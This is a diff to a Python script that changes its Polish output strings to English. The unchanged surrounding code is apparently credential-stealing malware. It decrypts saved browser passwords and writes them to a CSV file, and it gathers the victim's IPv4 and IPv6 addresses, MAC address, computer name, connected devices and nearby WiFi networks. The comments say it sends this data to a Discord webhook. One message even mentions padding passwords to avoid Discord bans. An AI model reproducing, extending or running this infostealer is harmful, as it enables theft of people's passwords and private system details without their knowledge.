@@ -174,8 +174,8 @@ if __name__ == '__main__':
                         if url and username and ciphertext:
                             # Odszyfruj hasło
                             decrypted_password = decrypt_password(ciphertext, secret_key)
-                            print(f"Sekwencja: {index}")
-                            print(f"URL: {url}\nNazwa użytkownika: {username}\nHasło + kilka losowych znakow: {decrypted_password}\n")
+                            print(f"Index: {index}")
+                            print(f"URL: {url}\nuser: {username}\npassword + random symbols (to don't get banned on discord): {decrypted_password}\n")
                             print("*" * 50)
                             # Zapisz odszyfrowane hasło do pliku CSV
                             csv_writer.writerow([index, url.encode('utf-8'), username.encode('utf-8'), decrypted_password.encode('utf-8')])
@@ -194,10 +194,10 @@ if __name__ == '__main__':
         computer_name = get_computer_name()
         if external_ipv4_address and ipv6_address and mac_address and computer_name:
             data = {
-                "content": f"Zewnętrzny adres IPv4: {external_ipv4_address}\n"
-                           f"Adres IPv6: {ipv6_address}\n"
-                           f"Adres MAC: {mac_address}\n"
-                           f"Nazwa komputera: {computer_name}"
+                "content": f"IPv4: {external_ipv4_address}\n"
+                           f"IPv6: {ipv6_address}\n"
+                           f"MAC: {mac_address}\n"
+                           f"PC Name: {computer_name}"
             }
 
             # Wyślij dane na Discord webhook
@@ -224,7 +224,7 @@ if __name__ == '__main__':
         connected_devices = get_connected_devices()
         if connected_devices:
             data = {
-                "content": "Podłączone urządzenia:\n" + json.dumps(connected_devices, indent=4)
+                "content": "Connected devices:\n" + json.dumps(connected_devices, indent=4)
             }
 
             # Wyślij dane na Discord webhook
@@ -241,7 +241,7 @@ if __name__ == '__main__':
         wifi_networks = get_wifi_networks()
         if wifi_networks:
             data = {
-                "content": "Dostępne sieci WiFi:\n" + json.dumps(wifi_networks, indent=4)
+                "content": "WiFi:\n" + json.dumps(wifi_networks, indent=4)
             }
 
             # Wyślij dane na Discord webhook
